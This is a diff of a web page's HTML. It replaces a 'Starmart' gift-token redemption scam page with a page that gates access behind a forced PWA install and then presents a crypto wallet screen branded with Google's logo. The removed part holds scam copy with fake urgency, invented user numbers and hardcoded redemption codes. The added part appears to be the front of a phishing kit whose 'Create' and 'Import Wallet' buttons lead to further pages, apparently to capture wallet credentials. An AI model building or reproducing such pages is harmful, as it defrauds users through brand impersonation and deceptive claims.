@@ -1,352 +1,693 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en"> 
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">
-  <link href="moneybox.jpeg" rel="icon" type="images/png">
-  <meta property="og:title" content="Buy and redeem gift tokens, instant withdraw to account">
-  <link href="../image.jpg" rel="icon" type="images/png">
-	<link rel="manifest" href="../manifest.json">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">
+    <title>Starmart</title>
+    <link rel="icon" href="../image.jpg" type="image/x-icon">
+	<meta name="theme-color" content="#0066ff">
+    <link rel="shortcut icon" href="preview.jpeg" type="image/x-icon">
+    <link rel="manifest" href="../manifest.json">
 	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <meta property="og:discription" content="Starmart">
-  <style>
-  body {
-  font-family: 'Arial', sans-serif;
-  margin: 0;
-  padding: 0;
-  line-height: 1.6;
-}
+    <script>
+        // Checks if running as PWA and redirects if rogged
+        if (window.matchMedia('(display-mode: standalone)') .matches) {
+            if (localStorage.getItem('rogged') === 'true') {
+                window.location.href = 'home.html';
+            }
+        }
+        // Checks if running as PWA and redirects if an account exists
+        if (window.matchMedia('(display-mode: standalone)') .matches) {
+            if (localStorage.getItem('walletCreated') === 'true') {
+                window.location.href = 'inflow.html';
+            }
+        }
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-/* Top Ad Styles */
-.top {
-	position: fixed;
-	top: 0;
-	display: flex;
-	background: #fff;
-	margin: 0;
-	justify-content: space-between;
-	box-sizing: border-box;
-	align-items: center;
-	width: 100%;
-  padding: 10px 20px;
-  z-index: 1000;
-  border-bottom: 2px solid #fff;
-  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-}
-.logo p{
-	font-size: 24px;
-	font-family: "Poppins", "Manrope", system-ui, sans-serif;
-  font-weight: 700;     
-  letter-spacing: -0.6px;
-  color: #0066ff;
-	margin: 0;
-}
-.logo i {
-	font-size: 30px;
-	margin-right: 10px;
-}
-.topBtn button{
-	font-size: 14px;
-	background: #fff;
-	color: #0066ff;
-	border: 2px solid #0066ff;
-	padding: 8px 12px;
-	border-radius: 20px;
-}
-/* Header */
-.header {
-  text-align: center;
-  padding: 2rem;
-  background-image: url('starmart.jpeg'); 
-  background-position: bottom; 
-  background-size: cover;
-  border-top: 10px solid black;
-	height: 220px;   
-}
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            line-height: 1.6;
+            color: #333;
+        }
+        .top {	
+            position: fixed;	
+            top: 0;	
+            display: flex;	
+            background: #fff;	
+            margin: 0;	
+            justify-content: space-between;
+            box-sizing: border-box;
+            align-items: center;	
+            width: 100%;
+            padding: 10px 20px; 
+            z-index: 1000;  
+            border-bottom: 2px solid #fff;  
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+        }
 
-.header h1, .lower h1 {
-  font-size: 3rem;
-  color: #ff6f61;
-  margin: 0;
-  filter: drop-shadow(2px 4px 6px black);
-  opacity: 0;
-}
+        .logo p{	
+            font-size: 24px;	
+            font-family: "Poppins", "Manrope", system-ui, sans-serif;
+            font-weight: 700;     
+            letter-spacing: -0.6px; 
+            color: #0066ff;	
+            margin: 0;
+        }
+       .logo i {	
+            font-size: 30px;	
+            margin-right: 10px;
+       }
+       .topBtn button{
+           font-size: 14px;
+           background: #fff;	
+           color: #0066ff;
+           border: 2px solid #0066ff;	
+           padding: 8px 12px;
+           border-radius: 20px;	
+           display: none;
+       }
 
-.header p, .lower p {
-  font-size: 1.2rem;
-  margin: 0.5rem 0;
-  color: #ff6f61;
-  opacity: 0;
-}
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
 
-/* Content */
-.content {
-  padding: 1.2rem;
-}
+        .install-screen {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #e8ecf5 0%, #e9eff8 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+			margin-top: 20px;
+        }
+ 
+        .app-content {
+            background: #f8f9fa;
+            min-height: 100vh;
+            display: flex;
+            padding: 60px 20px 20px;
+            align-items: center;
+            justify-content: center;
+        }
 
-section {
-  margin-bottom: 2rem;
-}
+        .wallet-container {
+            margin: auto;
+            max-width: 500px;
+            width: 100%;
+            background: white;
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            padding: 20px 20px 40px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
 
-h4 {
-  color: #0066ff;
-  margin-bottom: 0.5rem;
-  font-size: 20px;
-}
+        .wallet-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
 
-p, ul, li {
-  font-size: 1rem;
-  margin: 0.5rem 0;
-}
+        .feature-card {
+            background: #f5f9f5;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: flex-start;
+            gap: 16px;
+        }
 
-ul {
-  list-style-type: disc;
-  padding-left: 1rem;
-}
+        .feature-icon {
+            width: 40px;
+            height: 40px;
+            background: #4CAF50;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
 
-.form-container {
-    margin: 20px 0px;
-    padding: 5px 15px 40px;
-    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.15);
-    border-radius: 5px;
-	text-align: center;
-}
-.formHead {
-	text-align: center;
-	width: 100%;
-	font-size: 24px;
-	font-family: "Poppins", "Manrope", system-ui, sans-serif;
-	font-weight: 600;     
-	letter-spacing: -0.6px;
-}
-.input {
-	margin: 15px auto;
-}
-#response {
-	margin-bottom: 5px;
-	color: red;
-}
-.featured button {
-    padding: 10px 20px;
-    background: #0066ff;
-    color: white;
-    border: none;
-    border-radius: 10px;
-    cursor: pointer;
-	width: 100%;
-	margin: auto;
-    font-size: 16px;
-}
-button:disabled {
-    background: #ccc;
-    cursor: not-allowed;
-}
+        .feature-icon svg {
+            width: 20px;
+            height: 20px;
+            fill: white;
+        }
 
-.featured input {
-	background-color: transparent;
-	color: #000;
-    font-size: 20px;
-    border: 1px solid #000;
-	width: 100%;
-	box-sizing: border-box;
-	padding: 8px 12px;
-	outline: none;
-}
-.buy{
-	text-align: center;
-}
-.buy button{
-	font-size: 14px;
-	background: #fff;
-	color: #0066ff;
-	border: 2px solid #0066ff;
-	padding: 8px 12px;
-	border-radius: 20px;
-}
+        .feature-content h3 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
 
-/* About */
-#about{
-	padding-top: 30px;
-}
-.about h2{
-	margin: 0;
-}
-	  
-/* Reviews */	  
-blockquote {
-  font-style: italic;
-  padding-left: 1.2rem;
-  border-left: 4px solid #0066ff;
-  margin: 5px 0;
-}
-/* Reviews */	  
-.lower {
-  text-align: center;
-  padding: 2rem;
-  background-image: url('starmartb.jpeg'); 
-  background-size: 100% 100%; 
-  background-position: center;
-  background-repeat: no-repeat;
-}
+        .feature-content p {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.4;
+        }
 
-/* Footer */
-.footer {
-  text-align: center;
-  padding: 1rem;
-  color: #fff;
-  background-color: #ccc;
-}
+        .wallet-buttons {
+            margin: 20px;
+            display: flex;
+            flex-direction: row;
+            gap: 15px;
+            width: 100%;
+            margin: auto;
+        }
 
-.footer p {
-  font-size: 0.9rem;
-  margin: 0.5rem 0;
-}
+        .wallet-buttons button {
+            margin: auto;
+        }
 
-  </style>
+        .btn-primary {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 16px 24px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-primary:hover {
+            background: #45a049;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: #4CAF50;
+            border: 1px solid #4CAF50;
+            border-radius: 12px;
+            padding: 14px 24px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 15px;
+            margin-bottom: 24px;
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .icon-container {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 24px;
+        }
+
+        .ios-icon { background: #dbeafe; color: #2563eb; }
+        .android-icon { background: #dcfce7; color: #4CAF50; }
+        .desktop-icon { background: #f3e8ff; color: #9333ea; }
+
+        .card-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .install-steps {
+            margin: 20px 0;
+        }
+
+        .step {
+            display: flex !important;
+            align-items: flex-start !important;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .step-number {
+            background: #2563eb;
+            color: white;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+
+        .android .step-number { background: #4CAF50; }
+        .desktop .step-number { background: #9333ea; }
+
+        .step-content h3 {
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .step-content p {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .step-icon {
+            display: inline-block;
+            margin-right: 8px;
+            font-size: 16px;
+        }
+
+        .note {
+            background: #f0f8ff;
+            border: 1px solid #bfdbfe;
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 20px;
+        }
+
+        .android .note { background: #f0fdf4; border-color: #bbf7d0; }
+        .desktop .note { background: #faf5ff; border-color: #e9d5ff; }
+
+        .note p {
+            font-size: 14px;
+            color: #1e40af;
+        }
+
+        .android .note p { color: #2e7d32; }
+        .desktop .note p { color: #7c3aed; }
+
+        .text-center {
+            text-align: center;
+        }
+
+        .intro-text {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .intro-text h1 {
+            font-size: 28px;
+            font-weight: bold;
+            color: #1f2937;
+            margin-bottom: 8px;
+        }
+
+        .intro-text p {
+            color: #6b7280;
+            font-size: 15px;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .visible {
+            display: block !important;
+        }
+
+        .share-icon {
+            height: 1.2em;
+            vertical-align: middle;
+            margin: 0 5px;
+        }
+        
+        .welcome {        
+            display: flex;
+            margin: 10px;
+            align-items: center;
+            font-size: 20px;
+            font-weight: 600;
+            color: #4CAF50;
+            text-decoration: none;
+            justify-content: center;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .welcome img {
+            height: 28px;
+            margin-right: 8px;
+        }
+    </style>
 </head>
 <body>
-<!-- Top Page Advertisement -->
-  <div class="top">
+   <div class="top">
     <div class="logo">
       <p><i class="fa fa-balance-scale" aria-hidden="true"></i><strong>Starmart</strong></p>
 	</div>
 	<div class="topBtn">
 		<button id="redeemBtn">Redeem Token</button>
 	</div>
-  </div>
+  </div> 
+    <!-- Installation Required Screen -->
+    <div id="installScreen" class="install-screen">
+        <div class="container">
+            <div class="intro-text">
+                <h1>App Installation Required</h1>
+                <p>This content is only available as an installed app. Please follow the instructions below to install.</p>
+            </div>
 
-  <!-- Header Section -->
-  <header class="header">
-    <h1>Starmart</h1>
-    <p>Gift Token Like No Other</p>
-  </header>
+            <!-- iOS Installation Guide -->
+            <div id="iosGuide" class="card ios hidden">
+                <div class="card-header">
+                    <div class="icon-container ios-icon">📱</div>
+                    <h2 class="card-title">Install on iOS</h2>
+                </div>
+                <div class="install-steps">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h3>Tap the Share button<img src="share-icon.png" class="share-icon" alt="Share icon"></h3>
+                            <p>Usually at the bottom of Safari</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h3>Select "Add to Home Screen"</h3>
+                            <p><span class="step-icon">🏠</span>Scroll down to find this option</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h3>Tap "Add" to install</h3>
+                            <p>The app will appear on your home screen</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="note">
+                    <p><strong>Note:</strong> This only works in Safari browser. If you're using Chrome or another browser, please open this page in Safari first.</p>
+                </div>
+            </div>
 
-  <!-- Main Content -->
-  <main class="content">
-    <!-- Form Part -->
-    <section class="featured" id="featured">
-	<div id="form" class="form-container">
-     <form id="codeForm" method="post">
+            <!-- Android Installation Guide -->
+            <div id="androidGuide" class="card android hidden">
+                <div class="card-header">
+                    <div class="icon-container android-icon">📱</div>
+                    <h2 class="card-title">Install on Android</h2>
+                </div>
+                <div class="install-steps"> 
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h3>Tap the menu button</h3>
+                            <p><span class="step-icon">⋮ or ☰</span>Three dots in the top right corner or menu in the bottom right corner</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h3>Select "Add to Home screen"</h3>
+                            <p><span class="step-icon">🏠</span>Or "Install app" if available</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h3>Confirm installation</h3>
+                            <p>Tap "Add" or "Install" to complete</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="note">
+                    <p><strong>Tip:</strong> You might see an "Install" banner at the bottom of the screen. You can tap that instead!</p>
+                </div>
+            </div>
 
-		 <h3 class="formHead">REDEEM TOKEN</h3>
-		 
-		 <div class="input">
-			 <input type="tel" id="codeInput" name="phone" placeholder="Input Code" maxlength="19" required>
-		 </div>
-		 
-		 <div id="response"></div>
-		 
-		 <button type="submit" id="submitBtn">REDEEM</button>
-	 </form>
-	</div>
-    </section>
-	  
-    <!-- About Starmart -->
-    <section class="about" id="about">
-      <h2>Starmart Token</h2>
-      <p>Transfer across the globe, 100% on-chain, fully audited, and instantly delivered. No tricks, no waiting periods. Redeem your tokens, connect your wallet or account, and own them in seconds. This is how token exchange was always meant to be. <br>Hit “Redeem”, add account for payment and watch them instantly appear in your balance. It takes less than 10 Mins, thousands are claiming every hour. Don’t wait, secure what’s rightfully yours!</p>
-    </section>
+            <!-- Desktop Installation Guide -->
+            <div id="desktopGuide" class="card desktop hidden">
+                <div class="card-header">
+                    <div class="icon-container desktop-icon">💻</div>
+                    <h2 class="card-title">Install on Desktop</h2>
+                </div>
+                <div class="install-steps">
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h3>Look for the install icon</h3>
+                            <p><span class="step-icon">⬇️</span>In the address bar (Chrome/Edge)</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h3>Click "Install"</h3>
+                            <p>Or use the browser menu → "Install app"</p>
+                        </div>
+                    </div>
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h3>Confirm installation</h3>
+                            <p>The app will open in its own window</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="note">
+                    <p><strong>Note:</strong> Installation is supported in Chrome, Edge, and other Chromium-based browsers.</p>
+                </div>
+            </div>
 
-	<!-- BUY -->
-    <section class="buy">
-      <button onclick="window.location.href='buy.html'">BUY TOKEN</button>
-    </section> 
+            <!-- Generic Installation Guide -->
+            <div id="genericGuide" class="card hidden">
+                <div class="card-header">
+                    <h2 class="card-title">Install Required</h2>
+                </div>
+                <p class="text-center" style="color: #666;">
+                    Please install this app to access the content. Look for the install option in your browser menu.
+                </p>
+            </div>
+        </div>
+    </div>
 
-    <!-- Customer Reviews -->
-    <section class="reviews" id="reviews">
-      <h4>Administration</h4>
-      <blockquote>Starmart is one of the most extensive token shopping rewards programs on the internet. Find coupons, promo codes, deals, and cash back offers to your favorite stores. Combine with your preferred account to earn additional cash back.</blockquote>
-      <blockquote>Buy and redeem gift token easily. Instant payment, very small transaction fee and top notch reliability. No hidden fees or surprise charges, less than 10 Mins transaction time. Join now and lock in your spot in the community</blockquote>
-	</section>
+    <!-- Crypto Wallet App Content (shown only when installed) -->
+    <div id="appContent" class="app-content">
+        <div class="wallet-container">
+            <div class="welcome">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Wallet">
+            <span>Wallet</span>
+            </div>
+            <div class="wallet-header">
+                <p>Store, send and receive cryptocurrencies with bank-grade security</p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1M12 7C13.4 7 14.8 8.6 14.8 10V11.5C15.4 11.5 16 12.4 16 13V16C16 17.4 15.4 18 14.8 18H9.2C8.6 18 8 17.4 8 16V13C8 12.4 8.6 11.5 9.2 11.5V10C9.2 8.6 10.6 7 12 7M12 8.2C11.2 8.2 10.5 8.7 10.5 10V11.5H13.5V10C13.5 8.7 12.8 8.2 12 8.2Z"/>
+                    </svg>
+                </div>
+                <div class="feature-content">
+                    <h3>Secure Storage</h3>
+                    <p>Your private keys are encrypted and stored securely on your device.</p>
+                </div>
+            </div>
 
-	<!-- About Starmart -->
-	<section class="about">
-      <h2>Fast & Best</h2>
-      <p>The tokens you’re about to buy/redeem aren’t just numbers, they’re your early ticket to the future we’re building together. Every great journey starts with a single step. Take yours right now and join the community that’s changing everything.<br>Over 47,321 users redeemed tokens every 24 hours! The leaderboard is always heating up and top 500 redeemers every week unlocks bonus airdrops. Your tokens are waiting, get yours before someone else grabs the spot you deserve!</p>
-	</section>
-	  
-	<!-- BUY -->
-    <section class="buy">
-      <button onclick="window.location.href='buy.html'">BUY TOKEN</button>
-    </section>
-	  
-    <!-- Contact and Inquiries -->
-    <section class="contact" id="contact">
-      <h4>Contact and Inquiries</h4>
-      <p>If you have any questions about the payout or need assistance, please reach out to us:</p>
-      <ul>
-        <li>Email: <a href="mailto:info@govgrant.com">info@govgrant.com</a></li>
-        <li>Phone: (807) 420‑1498</li>
-        <li>Contact us for any for updates!</li>
-      </ul>
-    </section>
-  </main>
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M7,15H9C9,16.08 10.37,17 12,17C13.63,17 15,16.08 15,15C15,13.9 13.96,13.5 11.76,12.97C9.64,12.44 7,11.78 7,9C7,7.21 8.47,5.69 10.5,5.18V3H13.5V5.18C15.53,5.69 17,7.21 17,9H15C15,7.92 13.63,7 12,7C10.37,7 9,7.92 9,9C9,10.1 10.04,10.5 12.24,11.03C14.36,11.56 17,12.22 17,15C17,16.79 15.53,18.31 13.5,18.82V21H10.5V18.82C8.47,18.31 7,16.79 7,15Z"/>
+                    </svg>
+                </div>
+                <div class="feature-content">
+                    <h3>Very Low charges</h3>
+                    <p>Lowest transaction fees wallet for Bitcoin.</p>
+                </div>
+            </div>
 
-	<!-- Header Section -->
-  <header class="lower">
-    <h1>Starmart</h1>
-    <p>Gift Token Like No Other</p>
-  </header>
-	
-  <!-- Footer -->
-  <footer class="footer">
-    <p>&copy; 2005 Starmart. All rights reserved.</p>
-	  <small>Starmart®-related trademarks including “Starmart®”, “Token Codes®”, “Starmartakes®”, “StarButton”, “Starup”, “SM” and the Starmart logo are the property of Starmart, LLC; all rights reserved. Other trademarks appearing on this site are property of their respective owners, which do not endorse and are not affiliated with Starmart or its promotions.</small>
-  </footer>
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M9,11H15L13,9L15,7H9V9H11L9,11M7,5H17A2,2 0 0,1 19,7V17A2,2 0 0,1 17,19H7A2,2 0 0,1 5,17V7A2,2 0 0,1 7,5M7,7V17H17V7H7Z"/>
+                    </svg>
+                </div>
+                <div class="feature-content">
+                    <h3>Easy Transactions</h3>
+                    <p>Send and receive crypto with just a few taps.</p>
+                </div>
+            </div>
+
+            <div class="wallet-buttons">
+                <button class="btn-primary" id="toform">Create Wallet</button>
+                <button class="btn-secondary" id="importWallet">Import Wallet</button>
+            </div>
+        </div>
+    </div>
 	<script src="../sw.js"></script>
+    <script>   
+document.addEventListener('DOMContentLoaded', function() {
+    // Get the buttons by their IDs
+    const toFormButton = document.getElementById('toform');
+    const importWalletButton = document.getElementById('importWallet');
+
+    // Add click event listener to the first button
+    if (toFormButton) {
+        toFormButton.addEventListener('click', function() {
+            // Redirect to the flow page
+            window.location.href = 'flow.html'; 
+        });
+    }
+
+    // Add click event listener to the second button
+    if (importWalletButton) {
+        importWalletButton.addEventListener('click', function() {
+            // Redirect to the inflow page
+            window.location.href = 'inflow.html'; 
+        });
+    }
+});
+        
+        class PWAInstallGuard {
+            constructor() {
+                this.deviceType = 'unknown';
+                this.isStandalone = false;
+                this.init();
+            }
+
+            init() {
+                this.detectDevice();
+                this.checkStandalone();
+                this.showAppropriateContent();
+                this.setupEventListeners();
+            }
+
+            detectDevice() {
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                
+                // More comprehensive iOS detection
+                const isIOS = /iPad|iPhone|iPod/.test(userAgent) || 
+                             (platform === 'MacIntel' && navigator.maxTouchPoints > 1) ||
+                             /iPad/.test(userAgent) ||
+                             /iPhone/.test(userAgent) ||
+                             /iPod/.test(userAgent);
+
+                // Android detection
+                const isAndroid = /Android/.test(userAgent);
+
+                // Desktop detection (but not iOS masquerading as desktop)
+                const isDesktop = !isIOS && !isAndroid && 
+                                 (/Windows|Mac|Linux/.test(userAgent) || 
+                                  /Windows|Mac|Linux/.test(platform));
+
+                if (isIOS) {
+                    this.deviceType = 'ios';
+                } else if (isAndroid) {
+                    this.deviceType = 'android';
+                } else if (isDesktop) {
+                    this.deviceType = 'desktop';
+                } else {
+                    this.deviceType = 'unknown';
+                }
+            }
+
+            checkStandalone() {
+                // Multiple ways to check if app is installed/standalone
+                const isStandaloneDisplay = window.matchMedia('(display-mode: standalone)').matches;
+                const isStandaloneNavigator = window.navigator.standalone === true;
+                const isStandaloneReferrer = document.referrer.includes('android-app://');
+                
+                this.isStandalone = isStandaloneDisplay || isStandaloneNavigator || isStandaloneReferrer;
+            }
+
+            showAppropriateContent() {
+                const installScreen = document.getElementById('installScreen');
+                const appContent = document.getElementById('appContent');
+
+                if (this.isStandalone) {
+                    // Show app content if installed
+                    installScreen.style.display = 'none';
+                    appContent.style.display = 'block';
+                } else {
+                    // Show installation guide
+                    installScreen.style.display = 'flex';
+                    appContent.style.display = 'none';
+                    this.showInstallGuide();
+                }
+            }
+
+            showInstallGuide() {
+                // Hide all guides first
+                document.getElementById('iosGuide').classList.add('hidden');
+                document.getElementById('androidGuide').classList.add('hidden');
+                document.getElementById('desktopGuide').classList.add('hidden');
+                document.getElementById('genericGuide').classList.add('hidden');
+
+                // Show appropriate guide based on device
+                switch (this.deviceType) {
+                    case 'ios':
+                        document.getElementById('iosGuide').classList.remove('hidden');
+                        break;
+                    case 'android':
+                        document.getElementById('androidGuide').classList.remove('hidden');
+                        break;
+                    case 'desktop':
+                        document.getElementById('desktopGuide').classList.remove('hidden');
+                        break;
+                    default:
+                        document.getElementById('genericGuide').classList.remove('hidden');
+                        break;
+                }
+            }
+
+            setupEventListeners() {
+                // Listen for display mode changes
+                const mediaQuery = window.matchMedia('(display-mode: standalone)');
+                mediaQuery.addEventListener('change', () => {
+                    this.checkStandalone();
+                    this.showAppropriateContent();
+                });
+
+                // Listen for beforeinstallprompt event (for supported browsers)
+                window.addEventListener('beforeinstallprompt', (e) => {
+                    e.preventDefault();
+                });
+
+                // Listen for appinstalled event
+                window.addEventListener('appinstalled', () => {
+                    setTimeout(() => {
+                        this.checkStandalone();
+                        this.showAppropriateContent();
+                    }, 1000);
+                });
+            }
+        }
+
+        // Initialize the PWA Install Guard when the page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            new PWAInstallGuard();
+        });
+
+        // Also check when the page becomes visible (in case user switches back after installing)
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                setTimeout(() => {
+                    new PWAInstallGuard();
+                }, 500);
+            }
+        });
+
+        // Check when window regains focus
+        window.addEventListener('focus', () => {
+            setTimeout(() => {
+                new PWAInstallGuard();
+            }, 500);
+        });
+    </script>
 </body>
-	<script>
-		const codeInput = document.getElementById('codeInput');
-
-codeInput.addEventListener('input', (e) => {
-  let value = e.target.value.replace(/\s/g, ''); // remove existing spaces
-  if (value.length > 16) {
-    value = value.slice(0, 16); // limit to 16 digits
-  }
-  const formattedValue = value.match(/.{1,4}/g).join(' '); // add spaces every 4 digits
-  e.target.value = formattedValue;
-});
-		// Jump to input on click
-		document.getElementById('redeemBtn').addEventListener('click', () => {
-			codeInput.focus();
-			document.getElementById('form').scrollIntoView({ behavior: 'smooth' });
-});
-		// Form l submission
-        document.getElementById('codeForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-			
-			const code = codeInput.value.trim();
-			const expectedCode = '4303 2857 7503 7138';
-			const usedCode = '2693 3924 3825 6328';
-
-  
-			if (code === expectedCode) { 
-				const submitBtn = document.getElementById('submitBtn');
-				submitBtn.textContent = 'LOADING.....';
-				setTimeout(() => {
-					submitBtn.textContent = 'REDEEM';
-					window.location.href = 'redeem.html';
-				}, 3000);
-			} else if (code === usedCode) {
-				const response = document.getElementById('response');
-				response.style.color = '#999900';
-				response.textContent = 'Card has already been used. Try another.';
-				submitBtn.disabled = true;
-				setTimeout(() => {
-					response.textContent = '';
-					submitBtn.disabled = false;
-				}, 3000);
-			}else {
-				response.style.color = 'red';
-				response.textContent = 'Invalid code. Please enter a valid code.';
-				submitBtn.disabled = true;
-				setTimeout(() => {
-					response.textContent = '';
-					submitBtn.disabled = false;
-				}, 3000);
-			}
-		});
-	</script>
 </html>
-  
-  
